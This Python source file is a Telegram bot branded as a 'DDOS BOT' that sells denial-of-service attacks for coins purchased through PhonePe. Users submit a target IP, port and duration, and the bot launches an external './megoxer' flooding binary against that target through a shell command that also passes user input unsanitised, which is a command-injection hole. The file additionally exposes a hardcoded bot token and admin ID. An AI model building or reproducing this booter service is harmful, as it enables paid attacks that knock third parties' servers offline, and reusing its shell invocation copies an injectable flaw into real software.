import os
import json
import time
import telebot
import subprocess
from telebot import types
from threading import Thread, Lock

bot = telebot.TeleBot('7313441828:AAGyH9UutZm08HAWkOgk8-3FN_2-8QvyROk')

ADMIN_IDS = ["5816048581"]

LOG_FILE = 'log.txt'
COINS_FILE = 'coins.json'

# Global variables
ATTACK_COOLDOWN = 0  # Cooldown time in seconds (e.g., 1 minute)
last_attack_time = {}  # Dictionary to store the last attack time for each user
lock = Lock()  # Mutex for managing critical sections like file writing and coins update
ongoing_attacks = {} #Record ongoing attack in log file 

DEFAULT_COINS = 0
ATTACK_COST = 5

# Load coins data from the JSON file
def load_coins():
    with open(COINS_FILE, 'r') if os.path.exists(COINS_FILE) else open(COINS_FILE, 'w') as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

# Save coins data to the JSON file
def save_coins(data):
    with open(COINS_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Logging functions
def log_command(user_id, target, port, duration):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"UserID: {user_id}"
        with open(LOG_FILE, 'a') as f:
            f.write(f"Username: {username} | Target: {target} | Port: {port} | Time: {duration}\n")
    except Exception as e:
        print(f"Logging error: {e}")

def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w') as f:
            f.truncate(0)
        return "Logs cleared ✅"
    return "No data found."

# Bot command handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.chat.id)
    coins = load_coins()
    if user_id not in coins:
        coins[user_id] = DEFAULT_COINS
        save_coins(coins)

    welcome_message = (
        "🔰 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗘𝗚𝗢𝗫𝗘𝗥 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔰\n\n"
        "To perform an attack, you need coins. Each attack costs 5 coins.\n\n"
        "Use the `/coins` command to check your coin balance.\n\n"
    )

    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_attack = types.KeyboardButton('🚀 Attack')
    btn_info = types.KeyboardButton('ℹ️ My Info')
    btn_buy_coins = types.KeyboardButton('💰 Buy Coins')
    markup.add(btn_attack, btn_info, btn_buy_coins)

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['coins'])
def show_coins(message):
    user_id = str(message.chat.id)
    coins = load_coins()
    balance = coins.get(user_id, DEFAULT_COINS)
    bot.send_message(message.chat.id, f"💰 𝗬𝗼𝘂𝗿 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗰𝗼𝗶𝗻 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {balance} 𝗰𝗼𝗶𝗻𝘀")

@bot.message_handler(commands=['add'])
def add_coins(message):
    # Check if the user is an admin
    if str(message.chat.id) not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❗️ONLY ADMIN CAN USE THIS COMMAND.")
        return

    try:
        # Extract user ID and coin amount
        _, user_id, coin_amount = message.text.split()
        user_id = str(user_id)
        coin_amount = int(coin_amount)

        coins = load_coins()

        # Add coins to the user's balance
        if user_id in coins:
            coins[user_id] += coin_amount
        else:
            coins[user_id] = coin_amount

        save_coins(coins)
        bot.send_message(message.chat.id, f"✅ {coin_amount} 𝗰𝗼𝗶𝗻𝘀 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲𝗿 {user_id}.")
    except ValueError:
        bot.send_message(message.chat.id, "Use: /add <user_id> <coin_amount>")

def start_attack(user_id, target, port, duration):
    attack_id = f"{user_id} {target} {port}"
    user = bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else f"UserID: {user_id}"
    log_command(user_id, target, port, duration)
    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
    bot.send_message(user_id, response)
    
    try:
        # Start attack using subprocess (this runs the attack in a separate process)
        ongoing_attacks[attack_id] = subprocess.Popen(f"./megoxer {target} {port} {duration}", shell=True)
        
        # Wait for attack to finish (simulate attack duration)
        ongoing_attacks[attack_id].wait()

        # After attack is completed, notify user
        bot.send_message(user_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱! ✅")
    except Exception as e:
        bot.send_message(user_id, f"Error: Servers Are Busy Unable To Attack\n{e}")

@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def handle_attack_button(message):
    user_id = str(message.chat.id)
    if user_id:
        bot.send_message(message.chat.id, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲")
        bot.register_next_step_handler(message, handle_attack_details)

def handle_attack_details(message):
    user_id = str(message.chat.id)
    if user_id:
        try:
            target, port, duration = message.text.split()
            duration = int(duration)

            MAX_DURATION = 240
            if user_id not in ADMIN_IDS and duration > MAX_DURATION:
                bot.send_message(message.chat.id, f"❗️𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗧𝗶𝗺𝗲 𝗶𝘀 {MAX_DURATION} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀❗️")
                return

            # Check global cooldown
            current_time = time.time()
            if user_id in last_attack_time and current_time - last_attack_time[user_id] < ATTACK_COOLDOWN:
                remaining_cooldown = int(ATTACK_COOLDOWN - (current_time - last_attack_time[user_id]))
                bot.send_message(message.chat.id, f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗔𝗰𝘁𝗶𝘃𝗲! 𝗪𝗮𝗶𝘁 {remaining_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝗶𝗻𝗴 𝗮𝗴𝗮𝗶𝗻.")
                return

            # Check if the user has enough coins for the attack
            coins = load_coins()
            if coins.get(user_id, DEFAULT_COINS) < ATTACK_COST:
                bot.send_message(message.chat.id, "❗️𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗲𝗻𝗼𝘂𝗴𝗵 𝗰𝗼𝗶𝗻𝘀 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸")
                return

            # Deduct the coins from the user
            with lock:
                coins[user_id] -= ATTACK_COST
                save_coins(coins)

            # Update last attack time
            last_attack_time[user_id] = current_time

            # Proceed with the attack
            thread = Thread(target=start_attack, args=(user_id, target, port, duration))
            thread.start()

        except ValueError:
            bot.send_message(message.chat.id, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁𝗲")

@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def handle_my_info_button(message):
    user_id = str(message.chat.id)
    name = message.from_user.first_name
    username = message.from_user.username
    status = "Admin" if user_id in ADMIN_IDS else "User"
    coins = load_coins()
    balance = coins.get(user_id, DEFAULT_COINS)
    
    info_message = (
        f"ℹ️ 𝗬𝗢𝗨𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ℹ️\n\n"
        f"👤 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"🔑 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username if username else 'N/A'}\n"
        f"💰 𝗖𝗼𝗶𝗻 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} 𝗰𝗼𝗶𝗻𝘀\n"
    )
    
    bot.send_message(message.chat.id, info_message)
    
@bot.message_handler(func=lambda message: message.text == '💰 Buy Coins')
def handle_buy_coins_button(message):
    user_id = str(message.chat.id)
    phonepe_qr_message = (
        "📥 𝗕𝗨𝗬 𝗖𝗢𝗜𝗡𝗦 📥\n\n"
        "1️⃣ 𝗦𝗲𝗻𝗱 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝘁𝗼 𝗺𝘆 𝗣𝗵𝗼𝗻𝗲𝗣𝗲 𝗤𝗥 𝗖𝗼𝗱𝗲.\n"
        "2️⃣ 𝗦𝗲𝗻𝗱 𝗺𝗲 𝘁𝗵𝗲 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗 𝗳𝗼𝗿 𝗮𝗽𝗽𝗿𝗼𝘃𝗮𝗹.\n"
        "3️⃣ 𝗬𝗼𝘂𝗿 𝗰𝗼𝗶𝗻𝘀 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗮𝗱𝗱𝗲𝗱 𝗼𝗻𝗰𝗲 𝘃𝗲𝗿𝗶𝗳𝗶𝗲𝗱.\n\n"
        "💰 𝗥𝗮𝘁𝗲: 1 𝗜𝗡𝗥 = 1 𝗖𝗢𝗜𝗡\n"
    )

    # Replace `your_phonepe_qr_code_image_url` with your actual QR code image URL or send the image file directly.
    qr_code_path = "phonepe_qr.png"  # Ensure this file is in the same directory as your script.
    bot.send_photo(message.chat.id, photo=open(qr_code_path, 'rb'), caption=phonepe_qr_message)

    # Register next step for transaction ID input
    bot.send_message(message.chat.id, "🔄 𝗦𝗘𝗡𝗗 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗜𝗗 𝗔𝗡𝗗 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗔𝗠𝗢𝗨𝗡𝗧.")
    bot.register_next_step_handler(message, handle_transaction_id)

def handle_transaction_id(message):
    user_id = str(message.chat.id)
    try:
        # Assuming the message format is "<Transaction ID> <Amount>"
        transaction_id, amount = message.text.split()
        amount = int(amount)  # Convert the amount to an integer

        # Notify admin for manual verification
        for admin_id in ADMIN_IDS:
            bot.send_message(
                admin_id,
                f"🔔 𝗡𝗘𝗪 𝗕𝗨𝗬 𝗖𝗢𝗜𝗡𝗦 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 🔔\n\n"
                f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
                f"📤 𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗: {transaction_id}\n"
                f"💰 𝗔𝗺𝗼𝘂𝗻𝘁: {amount} INR\n\n"
                f"👉 𝗨𝘀𝗲 `/approve {user_id} {amount}` 𝘁𝗼 𝗮𝗽𝗽𝗿𝗼𝘃𝗲 𝗮𝗻𝗱 𝗮𝗱𝗱 𝗰𝗼𝗶𝗻𝘀.", parse_mode='Markdown'
            )

        bot.send_message(
            message.chat.id,
            "✅ 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂! 𝗬𝗼𝘂𝗿 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗿𝗲𝘃𝗶𝗲𝘄.\n"
            "𝗖𝗼𝗶𝗻𝘀 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗮𝗱𝗱𝗲𝗱 𝗮𝗳𝘁𝗲𝗿 𝗮𝗽𝗽𝗿𝗼𝘃𝗮𝗹."
        )
    except ValueError:
        bot.send_message(message.chat.id, "❗️𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁:\n [Transaction ID] [Amount]")

@bot.message_handler(commands=['approve'])
def approve_transaction(message):
    # Admin-only command to approve a transaction
    if str(message.chat.id) not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❗️𝗢𝗡𝗟𝗬 𝗔𝗗𝗠𝗜𝗡 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗.")
        return

    try:
        # Command format: /approve <user_id> <amount>
        _, user_id, amount = message.text.split()
        user_id = str(user_id)
        amount = int(amount)

        coins = load_coins()

        # Add coins to user's balance
        if user_id in coins:
            coins[user_id] += amount
        else:
            coins[user_id] = amount

        save_coins(coins)
        bot.send_message(message.chat.id, f"✅ {amount} 𝗰𝗼𝗶𝗻𝘀 𝘀𝗲𝗻𝘁 𝘁𝗼 𝘂𝘀𝗲𝗿 {user_id}.")
        bot.send_message(user_id, f"🎉 𝗬𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝗶𝘀 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱! {amount} 𝗰𝗼𝗶𝗻𝘀 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘆𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁.")
    except ValueError:
        bot.send_message(message.chat.id, "❗️𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲: /approve <user_id> <coins>")
        
        
@bot.message_handler(commands=['deduct'])
def deduct_coins(message):
    # Check if the user is an admin
    if str(message.chat.id) not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❗️𝗢𝗡𝗟𝗬 𝗔𝗗𝗠𝗜𝗡 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗.")
        return

    try:
        # Extract user ID and coin amount
        _, user_id, coin_amount = message.text.split()
        user_id = str(user_id)
        coin_amount = int(coin_amount)

        coins = load_coins()

        # Deduct coins from the user's balance
        if user_id in coins:
            if coins[user_id] >= coin_amount:
                coins[user_id] -= coin_amount
                save_coins(coins)
                bot.send_message(message.chat.id, f"📛 {coin_amount} 𝗰𝗼𝗶𝗻𝘀 𝗱𝗲𝗱𝘂𝗰𝘁𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗲𝗿 {user_id} 📛")
                bot.send_message(user_id, f"❗️{coin_amount} 𝗰𝗼𝗶𝗻𝘀 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗱𝗲𝗱𝘂𝗰𝘁𝗲𝗱 𝗳𝗿𝗼𝗺 𝘆𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝗯𝘆 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻❗️")
            else:
                bot.send_message(message.chat.id, "❗️𝗧𝗵𝗲 𝘂𝘀𝗲𝗿 𝗱𝗼𝗲𝘀 𝗻𝗼𝘁 𝗵𝗮𝘃𝗲 𝗲𝗻𝗼𝘂𝗴𝗵 𝗰𝗼𝗶𝗻𝘀")
        else:
            bot.send_message(message.chat.id, "❗️𝗧𝗵𝗲 𝘂𝘀𝗲𝗿 𝗱𝗼𝗲𝘀 𝗻𝗼𝘁 𝗲𝘅𝗶𝘀𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗱𝗮𝘁𝗮𝗯𝗮𝘀𝗲")
    except ValueError:
        bot.send_message(message.chat.id, "𝗨𝘀𝗮𝗴𝗲: /deduct <user_id> <coin>")
    except Exception as e:
        bot.send_message(message.chat.id, f"❗️ An error occurred: {e}")
        
        
@bot.message_handler(commands=['users'])
def list_users(message):
    # Check if the user is an admin
    if str(message.chat.id) not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❗️𝗢𝗡𝗟𝗬 𝗔𝗗𝗠𝗜𝗡 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗.")
        return

    try:
        coins = load_coins()

        # Filter users with 1 or more coins
        filtered_users = {user_id: balance for user_id, balance in coins.items() if balance >= 1}

        if not filtered_users:
            bot.send_message(message.chat.id, "𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱 𝘄𝗶𝘁𝗵 𝗰𝗼𝗶𝗻𝘀.")
            return

        # Generate the list of users and their coin balances
        user_list = "📋 𝗨𝘀𝗲𝗿𝘀 𝗪𝗶𝘁𝗵 𝗖𝗼𝗶𝗻𝘀 📋\n\n"
        for user_id, balance in filtered_users.items():
            user_list += f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id} \n💰 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} 𝗰𝗼𝗶𝗻𝘀\n\n"

        bot.send_message(message.chat.id, user_list)
    except Exception as e:
        bot.send_message(message.chat.id, f"❗️ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱: {e}")

@bot.message_handler(commands=['logs'])
def send_logs(message):
    # Check if the user is an admin
    if str(message.chat.id) not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❗️𝗢𝗡𝗟𝗬 𝗔𝗗𝗠𝗜𝗡 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗.")
        return

    # Check if the log file exists
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        # Send the log file to the admin
        with open(LOG_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📄 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗼𝗴𝘀")
    else:
        bot.send_message(message.chat.id, "📂 𝗡𝗼 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱.")
        

def start_bot():
    try:
        # Run your bot polling
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        print(f"Bot encountered an error: {e}")
        print("Restarting bot...")
        time.sleep(5)  # Wait for 5 seconds before restarting
        start_bot()  # Restart the bot

# Start the bot
start_bot()